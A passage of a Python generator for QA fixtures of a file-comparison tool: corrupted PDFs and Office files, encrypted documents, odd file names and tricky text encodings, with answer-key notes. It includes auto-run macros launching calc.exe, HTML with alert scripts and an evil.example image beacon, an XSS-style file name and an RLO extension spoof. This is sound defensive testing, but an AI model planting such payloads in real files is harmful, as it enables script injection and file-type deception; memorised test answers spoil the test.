           '06_議事メモ/打合せメモ_1101.txt': memo('11月1日 打合せメモ', 9), f'04_カタログ/{la}': annai(0)}
    L = dict(com); Rr = dict(com)
    L['00_送付状.txt'] = memo('提案書の送付状（2026年11月12日）', 4); Rr['00_送付状.txt'] = memo('提案書の送付状（2026年11月26日）', 4)
    L['01_提案書/提案概要.txt'] = memo('提案概要', 14); Rr['01_提案書/提案概要.txt'] = memo('提案概要', 14).replace('提案概要（5）', '提案概要（5）集中リモコンによる一括管理を追加')
    L['01_提案書/機器一覧.csv'] = kiki(0); Rr['01_提案書/機器一覧.csv'] = kiki(1)
    L['02_見積/見積明細.csv'] = f'項目,金額\n小計,{s0}\n値引き,-{d0}\n合計（税込）,{g0}\n'; Rr['02_見積/見積明細.csv'] = f'項目,金額\n小計,{s1}\n値引き,-{d1}\n合計（税込）,{g1}\n'
    L['02_見積/見積条件.txt'] = '納期：受注後 8週間\n有効期限：2026年12月11日\n保証：1年\n'; Rr['02_見積/見積条件.txt'] = '納期：受注後 10週間\n有効期限：2026年12月25日\n保証：2年\n'
    L['02_見積/値引き根拠_社内用.txt'] = memo('値引きの根拠（社内用。お客様へは出さない）', 5); Rr['06_議事メモ/打合せメモ_1120.txt'] = memo('11月20日 打合せメモ', 7)
    fa, fb = '提案書一式_みなと総合病院様_初回提出', '提案書一式_みなと総合病院様_再提出'
    for side, m in ((fa, L), (fb, Rr)):
        for k, v in m.items(): text(f'{d}/{side}/{k}', v)
        for nm in ('系統図_1階', '系統図_2階', '系統図_3階', '機器配置_屋上'): wbytes(f'{d}/{side}/03_図面/{nm}.png', png(nm.replace('_', ' '), mark=(nm == '系統図_2階' and side == fb)))
    for s in (fa, fb): assert sum(len(fs) for _, _, fs in os.walk(os.path.dirname(P(f'{d}/{s}/x')))) == 20
    key(d, f'フォルダ（各 20 ファイル、サブフォルダ 6 つ）{fa} ↔ {fb}：同じ内容 13（うち画像 3、長い名前のファイル 1＝04_カタログ の中）／内容が違う 6（00_送付状.txt＝日付（題名と4つの行）、01_提案書/提案概要.txt＝5番目の行、01_提案書/機器一覧.csv＝東館2階の台数 4→6 と 1行追加、'
           '02_見積/見積明細.csv＝3行とも、02_見積/見積条件.txt＝3行とも、03_図面/系統図_2階.png＝赤枠と赤い文字の追加）／左だけ 1（02_見積/値引き根拠_社内用.txt）／右だけ 1（06_議事メモ/打合せメモ_1120.txt）',
           'このレビュアーは、題材の中身よりも、小さな画面（768×1024・390×844 のタッチ、1280×720、720×450）で使えるかを見る')


# ==========================================================================================
# R20 品質保証部：異常系（壊れたファイル・拡張子違い・パスワード・変わった名前・変わった中身・仕掛けのある中身）
#     ここで作る「壊れた・仕掛けのあるファイル」は、すべてこのフォルダの中だけに置く。外部のあて先は evil.example（実在しない）
# ==========================================================================================
def r20(d):
    rnd = random.Random(2020)
    b1, b2, b3, b4, b5, b6, b7 = (f'{d}/{x}' for x in ('01_壊れたファイル', '02_拡張子と中身が違う', '03_パスワード付き', '04_変わった名前', '05_変わった中身のテキスト', '06_仕掛けのある中身', '07_ふつうのファイル'))
    rb = lambda p: open(P(p), 'rb').read()

    # ---- 07 ふつうのファイル（操作の割り込みの確認用。ほかの細工の元にも使う）
    TA = ['作業手順書　射出成形機 3号機　金型交換', '文書番号 QA-WI-0318　第4版', ''] + [f'手順 {i:03d}：' + ['電源を切り、操作盤に「作業中」の札を掛ける。', '金型の温度が 40℃ 以下になったことを、温度計で確かめる。', '冷却水のバルブを閉め、ホースを外す。', 'クレーンのフックを金型のアイボルトに掛ける。',
                                                                                              'クランプのボルトを対角の順にゆるめる（トルクレンチ 120 N·m）。', '金型をゆっくり引き出し、台車に載せる。', '取付面のごみ・油を、ウエスでふき取る。', '次の金型を載せ、位置決めピンに合わせる。',
                                                                                              'クランプのボルトを対角の順に締める（トルクレンチ 120 N·m）。', '冷却水のホースをつなぎ、漏れがないかを 3分間確かめる。'][i % 10] + f'（確認欄 {i:03d}）' for i in range(1, 198)]
    assert len(TA) == 200
    TB = list(TA); TB[1] = TB[1].replace('第4版', '第5版'); i40 = _ln(TB, '確認欄 011') - 1; assert '40℃ 以下' in TB[i40]; TB[i40] = TB[i40].replace('40℃ 以下', '35℃ 以下')
    for n in ('074', '148'): k = _ln(TB, f'確認欄 {n}') - 1; assert '120 N·m' in TB[k]; TB[k] = TB[k].replace('120 N·m', '140 N·m')
    del TB[_ln(TB, '確認欄 100') - 1]; TB.insert(_ln(TB, '確認欄 180'), '手順 180a：ホースの継手に、ゆるみ止めの印（白のペイント）を付ける。'); TB.append('以上')
    text(f'{b7}/作業手順書_A.txt', '\n'.join(TA) + '\n'); text(f'{b7}/作業手順書_B.txt', '\n'.join(TB) + '\n'); assert _only(TA, TB) == (5, 6) and len(TB) == 201
    def spec(v):
        pg = []
        for p in range(1, 21):
            ls = [f'# 受入検査仕様書　第{p}節', f'文書番号 QA-IS-2207　{p} / 20 ページ', '']
            for k in range(1, 29):
                s = f'{p}.{k}　検査項目 {p:02d}-{k:02d}：寸法 {((p * 37 + k * 13) % 400) / 10 + 5:.1f} mm、公差 ±{((p + k) % 5 + 1) / 20:.2f} mm、抜取り {(p * k) % 7 + 2} 個'
                if v and (p, k) == (3, 7): s = s.replace('抜取り', '全数検査に変更。もとは抜取り')
                if v and (p, k) == (11, 20): s = re.sub(r'公差 ±[\d.]+', '公差 ±0.01', s)
                if v and (p, k) == (20, 28): s += '（2026年12月から適用）'
                ls.append(s)
            pg.append(ls)
        return pg
    _pdf(f'{b7}/受入検査仕様書_20ページ_A.pdf', spec(0), size=10); _pdf(f'{b7}/受入検査仕様書_20ページ_B.pdf', spec(1), size=10)
    def haichi(v, size=(2000, 1400)):
        W, H = size; im = Image.new('RGB', size, 'white'); dr = ImageDraw.Draw(im); dr.rectangle([30, 30, W - 30, H - 30], outline='black', width=5); dr.text((60, 50), '第2工場 成形エリア 配置図', fill='black', font=font(W // 40, True))
        for k in range(8):
            x = 120 + (k % 4) * (W - 240) // 4; y = 260 + (k // 4) * 520; dr.rectangle([x, y, x + 300, y + 360], outline=(40, 40, 40), width=4, fill=(236, 240, 246)); dr.text((x + 60, y + 150), f'成形機 {k + 1}号' if not (v and k == 5) else '成形機 9号', fill='black', font=font(40))
        if v: dr.ellipse([W - 330, 80, W - 230, 180], outline=(214, 40, 40), width=8)
        return im
    haichi(0).save(P(f'{b7}/配置図_A.png')); haichi(1).save(P(f'{b7}/配置図_B.png'))
    key(d, '【このフォルダで確かめること】どのファイルを読み込んでも、①落ちない・固まらない ②理由の分かる案内が出る（「壊れています」「パスワードが必要です」など。黙って空の結果や、前に読み込んだファイルの結果を出さない）③スクリプトが動かない（alert が出ない）'
           '④外部（evil.example）へ通信しない。出力したレポート・パッチ・CSV を開いたときも同じ。以下は、ファイルの中身（作った事実）の一覧',
           f'07_ふつうのファイル：作業手順書_A.txt（200行）→ _B.txt（201行）＝2行目 第4版→第5版／{_ln(TA, "確認欄 011")}行目 40℃→35℃／{_ln(TA, "確認欄 074")}行目と{_ln(TA, "確認欄 148")}行目 120 N·m→140 N·m／A の{_ln(TA, "確認欄 100")}行目（手順 100）を削除／'
           f'B の{_ln(TB, "手順 180a")}行目に「手順 180a」を追加／B の末尾に「以上」を追加（変更 4 行・削除 1 行・追加 2 行）',
           '07_ふつうのファイル：受入検査仕様書_20ページ_A.pdf → _B.pdf（どちらも 20 ページ・1ページ 28 項目）＝3ページの項目 3.7（「全数検査に変更。もとは」を追加）／11ページの項目 11.20（公差 ±0.01 に変更）／20ページの項目 20.28（末尾に「（2026年12月から適用）」）。変更は 3 ページ・3 行',
           '07_ふつうのファイル：配置図_A.png → _B.png（2000×1400）＝下段の左から2番目「成形機 6号」→「成形機 9号」／右上に赤い丸を追加（2か所）')

    # ---- 01 壊れたファイル
    npdf = f'{b1}/正常なPDF（比較の相手用）.pdf'; _pdf(npdf, spec(0)[:3], size=10); pb = rb(npdf)
    nd = f'{b1}/正常なWord（比較の相手用）.docx'
    rdocx(nd, '不適合報告書', ['報告番号：NCR-2026-0412', '発生日：2026年11月18日', '品名：樹脂カバー（品番 RC-2207-B）', '不適合の内容：外観検査で、ゲート付近に銀条（シルバーストリーク）を 12 個中 3 個に確認した。',
                               ('table', [['区分', '数量', '処置'], ['良品', '9', '出荷'], ['不適合品', '3', '廃棄']]), '原因：材料の乾燥時間の不足（規定 4時間に対して 2.5時間）。', '是正処置：乾燥機のタイマーに、下限のインターロックを追加する（期限 12月5日）。'], header='品質保証部 様式 QA-12', author='品質保証部', date='2026-11-20T01:00:00Z')
    db = rb(nd)
    def nxlsx(path, vba=None, v=0):
        wb = xlsxwriter.Workbook(P(path)); ws = wb.add_worksheet('検査記録'); ws.write_row(0, 0, ['ロット', '検査日', '検査数', '不適合数', '不適合率', '判定'])
        for i in range(30):
            n, ng = 200 + i * 10, (i * 7) % 5 + (1 if v and i == 12 else 0)
            ws.write_row(i + 1, 0, [f'L2611-{i + 1:03d}', f'2026/11/{i % 28 + 1:02d}', n, ng]); ws.write_formula(i + 1, 4, f'=D{i + 2}/C{i + 2}', wb.add_format({'num_format': '0.0%'}), ng / n); ws.write_string(i + 1, 5, '合格' if ng <= 3 else '保留')
        if vba: wb.add_vba_project(vba)
        wb.close()
    nx = f'{b1}/正常なExcel（比較の相手用）.xlsx'; nxlsx(nx); xb = rb(nx); assert 'xl/sharedStrings.xml' in zipfile.ZipFile(io.BytesIO(xb)).namelist()
    wbytes(f'{b1}/途中で切れたPDF.pdf', pb[:len(pb) * 55 // 100]); wbytes(f'{b1}/末尾の20バイトが欠けたPDF.pdf', pb[:-20])
    i1 = pb.rindex(b'trailer'); i0 = pb.rindex(b'xref', 0, i1); assert 0 < i0 < i1
    bad = pb[:i0] + re.sub(rb'\d{10} (\d{5}) n', lambda m: b'0000000007 ' + m.group(1) + b' n', pb[i0:i1]) + re.sub(rb'startxref\s+\d+', b'startxref\n9999999', pb[i1:]); assert bad != pb and len(bad) >= len(pb)
    wbytes(f'{b1}/xrefの壊れたPDF.pdf', bad); wbytes(f'{b1}/先頭だけPDFで中身は乱数.pdf', b'%PDF-1.7\n%\xe2\xe3\xcf\xd3\n' + rnd.randbytes(30000))
    for nm in ('0バイト.pdf', '0バイト.docx', '0バイト.xlsx', '0バイト.png', '0バイト_A.txt', '0バイト_B.txt'): wbytes(f'{b1}/{nm}', b'')
    wbytes(f'{b1}/sharedStringsのないExcel.xlsx', _rezip(xb, drop=('xl/sharedStrings.xml',)))
    wbytes(f'{b1}/document.xmlが壊れたWord.docx', _rezip(db, repl={'word/document.xml': lambda b: b[:len(b) * 6 // 10]}))
    wbytes(f'{b1}/document.xmlのないWord.docx', _rezip(db, drop=('word/document.xml',)))
    wbytes(f'{b1}/途中で切れたWord.docx', db[:len(db) // 2]); wbytes(f'{b1}/途中で切れたExcel.xlsx', xb[:len(xb) // 2])
    for nm, src in (('暗号化されたWord（パスワード qa-2026）.docx', db), ('暗号化されたExcel（パスワード qa-2026）.xlsx', xb)):
        enc = _office_encrypt(src, 'qa-2026', rnd); assert enc[:8] == b'\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1' and _office_decrypt(enc, 'qa-2026') == src and _office_decrypt(enc, 'qa-2027') is None
        wbytes(f'{b1}/{nm}', enc)
    vb = P(f'{b1}/_vba.bin'); open(vb, 'wb').write(_vba_project('ThisWorkbook', 'Sub Auto_Open()\r\n    MsgBox "マクロが実行されました（R20）"\r\n    Shell "calc.exe"\r\nEnd Sub\r\n'))
    nxlsx(f'{b1}/検査記録_マクロつき.xlsm', vba=vb, v=1); os.remove(vb)
    zz = zipfile.ZipFile(P(f'{b1}/検査記録_マクロつき.xlsm')); assert 'xl/vbaProject.bin' in zz.namelist() and b'macroEnabled' in zz.read('[Content_Types].xml'); zz.close()
    ct = lambda b: b.replace(b'application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml', b'application/vnd.ms-word.document.macroEnabled.main+xml').replace(b'<Default ', b'<Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/><Default ', 1)
    rl = lambda b: b.replace(b'</Relationships>', b'<Relationship Id="rIdVba1" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="vbaProject.bin"/></Relationships>')
    dm = _rezip(db, repl={'[Content_Types].xml': ct, 'word/_rels/document.xml.rels': rl, 'word/document.xml': lambda b: b.replace('12 個中 3 個'.encode(), '12 個中 4 個'.encode())},
                add={'word/vbaProject.bin': _vba_project('ThisDocument', 'Sub AutoOpen()\r\n    MsgBox "マクロが実行されました（R20）"\r\nEnd Sub\r\n')})
    assert b'macroEnabled' in zipfile.ZipFile(io.BytesIO(dm)).read('[Content_Types].xml') and '12 個中 4 個'.encode() in zipfile.ZipFile(io.BytesIO(dm)).read('word/document.xml')
    wbytes(f'{b1}/不適合報告書_マクロつき.docm', dm)
    key(d, '01_壊れたファイル：「正常な…（比較の相手用）」の PDF（3ページ）・Word・Excel（30行）が元。これを壊したもの＝途中で切れたPDF（先頭 55％）／末尾の20バイトが欠けたPDF（%%EOF がない。中身は元と同じなので、読めるなら元と「差異なし」のはず）／'
           'xrefの壊れたPDF（相互参照表の位置がすべて 7、startxref が 9999999。中身は元と同じ）／先頭だけPDFで中身は乱数／0バイト（pdf・docx・xlsx・png・txt 2つ）／sharedStringsのないExcel（文字のセルの中身が入っている部品がない。数値と数式は残っている）／'
           'document.xmlが壊れたWord（本文の XML が 60％ で切れている）／document.xmlのないWord／途中で切れたWord・Excel（ZIP の後ろ半分がない）',
           '01_壊れたファイル：暗号化されたWord・Excel（パスワード qa-2026。Office でパスワードを付けて保存した形＝拡張子は docx・xlsx だが、中身は ZIP でなく OLE 形式。ECMA-376 標準暗号化 AES-128。ツールはパスワードを尋ねない仕様でも、'
           '「暗号化されているので読めない」と分かる案内が出ること。黙って文字化けやバイナリ表示にならないこと）',
           '01_壊れたファイル：検査記録_マクロつき.xlsm と 不適合報告書_マクロつき.docm（vbaProject.bin を持つ。マクロは Auto_Open・AutoOpen）。xlsm は「正常なExcel」と比べると 14行目（ロット L2611-013）の不適合数が 4→5（不適合率の数式は同じで、値が 4/320→5/320）、'
           'docm は「正常なWord」と比べると「12 個中 3 個」→「12 個中 4 個」。マクロそのものは比べられない（そのことが分かるか）。vbaProject.bin は入れ物の形だけ整えたもので、Office での実行は確かめていない')

    # ---- 02 拡張子と中身が違う
    sm = io.BytesIO(); haichi(0, (800, 560)).save(sm, 'PNG'); jp = io.BytesIO(); haichi(1, (800, 560)).save(jp, 'JPEG', quality=90)
    mz = b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8' + bytes(47) + b'\x0e\x1f\xba\x0e\x00\xb4\x09\xcd\x21\xb8\x01\x4c\xcd\x21This program cannot be run in DOS mode.\r\r\n$' + bytes(7) + b'PE\x00\x00' + bytes(900)
    zb = io.BytesIO()
    with zipfile.ZipFile(zb, 'w') as z: z.writestr('readme.txt', 'これは Office 文書ではない、ふつうの ZIP です。\n')
    for nm, b in (('中身はPNG.pdf', sm.getvalue()), ('中身はPDF.txt', pb), ('中身は実行ファイルのヘッダ（MZ）.csv', mz), ('中身はJPEG.png', jp.getvalue()), ('中身はふつうのZIP.docx', zb.getvalue()), ('中身はテキスト.xlsx', 'ロット,検査数\nL2611-001,200\n'.encode()),
                  ('中身はHTML.docx', '<!doctype html><html><head><meta charset="utf-8"><title>報告書</title><script>alert("r20-html-as-docx")</script></head><body onload="alert(\'r20-onload\')"><h1>不適合報告書</h1><p>これは Word 文書ではなく HTML です。</p><img src="https://evil.example/t.gif"></body></html>\n'.encode())):
        wbytes(f'{b2}/{nm}', b)
    key(d, '02_拡張子と中身が違う：中身はPNG.pdf（800×560 の配置図）／中身はPDF.txt（「正常なPDF」と同じバイト列）／中身は実行ファイルのヘッダ（MZ）.csv（先頭が MZ のバイナリ 1,000 バイトほど。動く実行ファイルではない）／'
           '中身はJPEG.png（配置図 B の JPEG）／中身はふつうのZIP.docx／中身はテキスト.xlsx／中身はHTML.docx（script・onload・外部画像を含む HTML）。拡張子でなく中身で判断されるか、判断の結果が画面で分かるか。「中身はPNG.pdf」と 07 の配置図、「中身はPDF.txt」と「正常なPDF」は比べられるはず')

    # ---- 03 パスワード付き PDF
    def kei(v): return [['# 取引基本契約書（抜粋）', '', '第1条（目的）　甲は乙に対し、成形部品を継続して発注し、乙はこれを受注する。', '第2条（単価）　単価は、別紙の単価表による。単価の見直しは、' + ('半年' if v else '1年') + 'ごとに協議する。',
                         '第3条（納期）　乙は、注文書の納期を守る。遅れるおそれがあるときは、' + ('ただちに' if v else '3日前までに') + '甲に知らせる。', '第4条（検査）　甲は、納入から 10日以内に受入検査を行う。',
                         '第5条（支払）　月末締め、翌月' + ('20日' if v else '末日') + '払いとする。', '第6条（秘密の保持）　甲乙は、相手方の図面・仕様を第三者に見せない。', '', '2026年12月1日']]
    _pdf(f'{b3}/取引基本契約書_B（パスワードなし）.pdf', kei(1), size=11); tmp = P(f'{b3}/_a.pdf'); _pdf(f'{b3}/_a.pdf', kei(0), size=11)
    from pypdf import PdfReader, PdfWriter
    def enc(dst, user, owner=None, alg='AES-256'):
        w = PdfWriter(clone_from=tmp); w.encrypt(user, owner_password=owner, algorithm=alg); w.write(P(f'{b3}/{dst}'))
        r = PdfReader(P(f'{b3}/{dst}')); assert r.is_encrypted and r.decrypt(user) and '第1条' in r.pages[0].extract_text()
    enc('取引基本契約書_A（パスワード qa-2026）.pdf', 'qa-2026'); enc('取引基本契約書_A（古い方式 RC4・パスワード qa-2026）.pdf', 'qa-2026', alg='RC4-128'); enc('取引基本契約書_A（日本語のパスワード ひみつのかぎ）.pdf', 'ひみつのかぎ')
    enc('取引基本契約書_A（開くパスワードなし・編集だけ制限）.pdf', '', owner='owner-qa-2026'); os.remove(tmp)
    key(d, '03_パスワード付き：取引基本契約書_A の4つは、中身が同じで暗号の掛け方だけが違う＝①AES-256・パスワード qa-2026 ②古い方式 RC4-128・パスワード qa-2026 ③AES-256・日本語のパスワード「ひみつのかぎ」（ひらがな6文字）'
           '④開くパスワードなし（編集の制限だけ。パスワードを尋ねずに開けるはず）。_B（パスワードなし）との違いは 3 行＝第2条 1年→半年／第3条 3日前までに→ただちに／第5条 翌月末日→翌月20日。'
           'まちがったパスワード・キャンセルのあと、もう一度読み込めるか。パスワードがどこにも残らないか')

    # ---- 04 変わった名前（A・B の2つのフォルダに同じ名前で置く）
    long = '令和八年度' + '第三四半期連結決算説明資料及び補足資料' * 3 + '（取締役会提出用）最終確定版.txt'; assert 200 <= len(long.encode('utf-8')) <= 255
    pg = 'プログラムのデータ.txt'; nfc, nfd = unicodedata.normalize('NFC', pg), unicodedata.normalize('NFD', pg); assert nfc != nfd
    NM = [('請求書_11月分‮fdp.txt', '向きを変える制御文字 U+202E（RLO）を含む。画面では「請求書_11月分txt.pdf」のように、PDF に見えることがある'), ('📊売上集計🍣_最終版👍.txt', '絵文字'), ('家族👨‍👩‍👧_旗🇯🇵_肌の色👍🏽.txt', '絵文字の合成（ZWJ・国旗・肌の色）'),
          (long, f'とても長い名前（{len(long)} 文字・{len(long.encode("utf-8"))} バイト）'), ('.先頭がドット.txt', '先頭がドット'), ('.gitignore', '先頭がドットで、拡張子がない'), (' 先頭に空白.txt', '先頭に半角の空白'), ('末尾に空白.txt ', '拡張子のあとに半角の空白'),
          ('拡張子の前に空白 .txt', '拡張子の前に半角の空白'), ("売上#1_達成率100%_A&B社_O'Neil.txt", "# % & ' を含む"), ('%E3%81%82%20%2e%2e%2f.txt', 'URL エンコードのように見える名前'), ('README.TXT', '大文字'), ('readme.txt', '小文字（README.TXT と大文字小文字だけが違う、別のファイル）'),
          (nfc, '「プログラムのデータ.txt」NFC（濁点・半濁点が1文字に合成された形）'), (nfd, '「プログラムのデータ.txt」NFD（濁点・半濁点が別の文字。上と見た目が同じ、別のファイル）'), ('ﾊﾝｶｸｶﾅのﾌｧｲﾙ.txt', '半角カナ'),
          ('全角　空白とＡＢＣ１２３.txt', '全角の空白・英数字'), ('​見えない文字（ゼロ幅）.txt', '先頭にゼロ幅スペース U+200B'), ('NUL.txt', 'Windows では使えない予約名'), ('名前に.ドットが..多い...txt', 'ドットが多い'), ('拡張子なし', '拡張子がない'), ('<img src=x onerror=alert(1)>.txt', 'HTML のタグの形')]
    assert len({n for n, _ in NM}) == 22
    for i, (nm, ds) in enumerate(NM):
        wbytes(f'{b4}/A/{nm}', f'{i + 1:02d}番のファイル：{ds}\n金額：{1000 + i * 111}円\n'.encode()); wbytes(f'{b4}/B/{nm}', f'{i + 1:02d}番のファイル：{ds}\n金額：{1000 + i * 111 + (i % 2)}円\n'.encode())
    assert len(os.listdir(P(f'{b4}/A/x')[:-2])) == 22 and len(os.listdir(P(f'{b4}/B/x')[:-2])) == 22
    key(d, '04_変わった名前：A・B のフォルダに、同じ名前のファイルが 22 個ずつ。中身は2行（1行目＝番号と名前の説明、2行目＝金額）。**偶数番（2・4・…・22番）の 11 個は B の金額が 1円多い。奇数番の 11 個は同じ**。'
           '1行目の番号で、別のファイルと取り違えていないかが分かる（README.TXT は 12番で違いあり、readme.txt は 13番で同じ。NFC は 14番で違いあり、NFD は 15番で同じ）',
           '04_変わった名前の一覧：' + '／'.join(f'{i + 1}番 {ds}' for i, (nm, ds) in enumerate(NM)) + '。フォルダ比較の一覧・ファイル欄・タブ・レポート・ダウンロードするファイルの名前で、表示が崩れないか、向きを変える文字で拡張子を見誤らないか、名前の中のタグが動かないか')

    # ---- 05 変わった中身のテキスト
    T5 = lambda nm, s, **kw: text(f'{b5}/{nm}', s, **kw)
    nul = 'コード\t品名\t数量\nA-01\tボルト\x00M8\t100\nA-02\tナット\x00M8\t200\nA-03\tワッシャー\t300\n\x00\nA-05\t最後の行\t500\n'; T5('NULを含む_A.txt', nul); T5('NULを含む_B.txt', nul.replace('\t200', '\t250'))
    u = lambda s: s.encode('utf-16-le')
    sur = lambda v: b'\xff\xfe' + u('1行目：通常の行\n2行目：片割れ（上位）→') + b'\x3d\xd8' + u('←ここ\n3行目：金額 ' + ('1,500' if v else '1,000') + '円\n4行目：片割れ（下位）→') + b'\x00\xdc' + u('←ここ\n5行目：最後の行\n')
    wbytes(f'{b5}/片割れのサロゲートを含むUTF-16_A.txt', sur(0)); wbytes(f'{b5}/片割れのサロゲートを含むUTF-16_B.txt', sur(1))
    bom = '品番,数量\nRC-2207-A,120\nRC-2207-B,80\n'.encode(); wbytes(f'{b5}/BOMが2つ_A.txt', b'\xef\xbb\xbf\xef\xbb\xbf' + bom); wbytes(f'{b5}/BOMが2つ_B（BOMは1つ）.txt', b'\xef\xbb\xbf' + bom)
    wbytes(f'{b5}/改行の混在_A.txt', 'LF の行\nCRLF の行\r\nCR の行\rLF の行 2\nCRLF の行 2\r\n最後の行（改行なし）'.encode()); wbytes(f'{b5}/改行の混在_B（すべてLF）.txt', 'LF の行\nCRLF の行\nCR の行\nLF の行 2\nCRLF の行 2\n最後の行（改行なし）'.encode())
    wbytes(f'{b5}/改行の混在_C（1行変更）.txt', 'LF の行\nCRLF の行\r\nCR の行（変更）\rLF の行 2\nCRLF の行 2\r\n最後の行（改行なし）'.encode())
    one = ''.join(f'品番{i:06d}の在庫は{(i * 37) % 9000 + 1000:04d}個です。' for i in range(50000)); assert len(one) == 1000000
    o2 = list(one); p1, p2 = 12500 * 20 + 12, 49999 * 20 + 15; o2[p1] = '9' if o2[p1] != '9' else '8'; o2[p2] = '0' if o2[p2] != '0' else '1'; one2 = ''.join(o2)
    assert [i for i in range(1000000) if one[i] != one2[i]] == [p1, p2] and one[p1].isdigit() and one[p2].isdigit()
    T5('1行100万文字_A.txt', one); T5('1行100万文字_B.txt', one2)
    ctl = ['通常の行', 'ベル\x07の入った行', '後退\x08の入った行', '垂直タブ\x0bの入った行', '改ページ\x0cの入った行', 'エスケープ \x1b[31m赤い文字\x1b[0m の行', '削除文字\x7fの入った行', 'C1 の制御文字 \x85（NEL）と \x9b の行', '行区切り （U+2028）と段落区切り （U+2029）の行', '金額：1,000円', '最後の行']
    ctl2 = list(ctl); ctl2[1] = 'ベルの入った行'; ctl2[9] = '金額：1,200円'; T5('制御文字_A.txt', '\n'.join(ctl) + '\n'); T5('制御文字_B.txt', '\n'.join(ctl2) + '\n')
    zw = ['東京都千代田区', '大阪府大阪市北区', '愛知県名古屋市中区', '福岡県福岡市博多区', '北海道札幌市中央区', '宮城県仙台市青葉区', '広島県広島市中区']; zc = ['​', '‌', '‍', '⁠', '﻿', '­']
    zw2 = [s[:3] + zc[i] + s[3:] if i < 6 else s for i, s in enumerate(zw)]; T5('ゼロ幅の文字_A（なし）.txt', '\n'.join(zw) + '\n'); T5('ゼロ幅の文字_B（あり）.txt', '\n'.join(zw2) + '\n')
    rtl = ['アラビア語：مرحبا بالعالم（こんにちは、世界）', 'ヘブライ語：שלום עולם（こんにちは、世界）', '混在：請求先は شركة الميناء 様、金額は 1,200 ドル', '向きの制御（RLO）：支払先 ‮knab otanim‬ に振り込む', '向きの分離（RLI…PDI）：担当 ⁧מנהל⁩ が承認', '右から左の印（RLM）：100‏％', '通常の行：ここまで']
    rtl2 = list(rtl); rtl2[2] = rtl2[2].replace('1,200', '1,500'); rtl2[3] = rtl2[3].replace('knab otanim', 'knab atanim'); rtl2[6] = '通常の行：‎ここまで'; T5('右から左の文字と向きの制御_A.txt', '\n'.join(rtl) + '\n'); T5('右から左の文字と向きの制御_B.txt', '\n'.join(rtl2) + '\n')
    nf = ['ガギグゲゴ パピプペポ（カタカナの濁点・半濁点）', 'が ぎ ぐ げ ご ぱ ぴ（ひらがなの濁点・半濁点）', 'é è ñ ü Å（アクセントの付いたラテン文字）', '한국어（ハングル）', 'ABC 123 漢字の行（変化なし）', '神戸の渡邊と髙橋（変化なし）']
    n1, n2 = [unicodedata.normalize('NFC', s) for s in nf], [unicodedata.normalize('NFD', s) for s in nf]; ndiff = sum(1 for a, b in zip(n1, n2) if a != b); assert ndiff == 4
    T5('結合文字_NFC.txt', '\n'.join(n1) + '\n'); T5('結合文字_NFD.txt', '\n'.join(n2) + '\n')
    bl = [f'区切り {i // 1000 + 1:03d}' if i % 1000 == 0 else '' for i in range(100000)]; bl2 = list(bl); k77 = _ln(bl2, '区切り 077') - 1; bl2[k77] = '区切り 077（変更）'; assert bl2[50499] == ''; del bl2[50499]; bl2 += ['', '', '']
    T5('とても多い空行_A.txt', '\n'.join(bl) + '\n'); T5('とても多い空行_B.txt', '\n'.join(bl2) + '\n'); assert len(bl2) == 100002
    tw = [f'{i + 1:02d} 検査項目 {chr(0x41 + i)}：合格' for i in range(20)]; tw2 = list(tw)
    for ln_, sfx in ((3, ' '), (7, '\t'), (12, '　'), (15, '  '), (20, ' \t ')): tw2[ln_ - 1] += sfx
    T5('末尾の空白だけの違い_A.txt', '\n'.join(tw) + '\n'); T5('末尾の空白だけの違い_B.txt', '\n'.join(tw2) + '\n')
    key(d, f'05_変わった中身のテキスト：NULを含む_A/B.txt（UTF-8 のテキストの中に NUL が {nul.count(chr(0))} 個。6行。違いは3行目の数量 200→250 だけ。バイナリ扱いになるなら、その案内が出るか）',
           '05：片割れのサロゲートを含むUTF-16_A/B.txt（UTF-16LE・BOM あり・5行。2行目に上位だけ（D83D）、4行目に下位だけ（DC00）の、対になっていないサロゲート。違いは3行目 1,000円→1,500円 だけ）',
           '05：BOMが2つ_A.txt（先頭に UTF-8 の BOM が2つ）と BOMが2つ_B（BOMは1つ）.txt。それ以外は同じ3行。違いは、1行目の先頭の見えない文字 U+FEFF 1つだけ（違いとして出るなら、何が違うのかが分かるか）',
           '05：改行の混在_A.txt（LF・CRLF・CR・LF・CRLF・改行なし の6行）／_B（すべてLF）.txt は文字が同じで改行コードだけが違う／_C（1行変更）.txt は A と同じ改行で、3行目だけ「CR の行（変更）」。CR だけの改行が行の区切りとして扱われるか、混在が知らされるか',
           f'05：1行100万文字_A/B.txt（改行のない1行、ちょうど 1,000,000 文字、2,000,000 バイト）。違いは2文字だけ＝{p1 + 1:,} 文字目（{one[p1]}→{one2[p1]}）と {p2 + 1:,} 文字目（{one[p2]}→{one2[p2]}）',
           '05：制御文字_A/B.txt（11行。BEL・BS・VT・FF・ESC（色の指定）・DEL・C1（U+0085・U+009B）・U+2028・U+2029 を含む）。違いは2行＝2行目（A にある BEL（U+0007）が B にはない。見た目は同じ）と、10行目 1,000円→1,200円。VT・FF・U+0085・U+2028・U+2029 を改行として数えると、行数が合わなくなる',
           '05：ゼロ幅の文字_A（なし）.txt と _B（あり）.txt（7行）。1〜6行目は、B の3文字目のあとに見えない文字が1つ入っている（順に U+200B・U+200C・U+200D・U+2060・U+FEFF・U+00AD）。7行目は同じ。見た目が同じ 6 行が「違う」と出て、どこが違うかが分かるか',
           '05：右から左の文字と向きの制御_A/B.txt（7行。アラビア文字・ヘブライ文字・RLO（U+202E）・RLI/PDI（U+2067・U+2069）・RLM（U+200F））。違いは3行＝3行目 1,200→1,500／4行目 RLO で逆向きに表示される部分の otanim→atanim（1文字）／7行目に見えない LRM（U+200E）を1つ追加',
           f'05：結合文字_NFC.txt と 結合文字_NFD.txt（6行。同じ文章を、合成済みと分解の形で保存したもの）。符号の並びが違うのは 1〜4行目の {ndiff} 行、5・6行目は同じ。見た目は全行同じ',
           f'05：とても多い空行_A.txt（100,000 行。1,000 行ごとに「区切り 001」〜「区切り 100」、ほかは空行）→ _B.txt（100,002 行）＝{k77 + 1:,} 行目「区切り 077」→「区切り 077（変更）」／50,500 行目の空行を1つ削除／末尾に空行を3つ追加。「空行を無視」にすると、違いは「区切り 077」の1つだけになるはず',
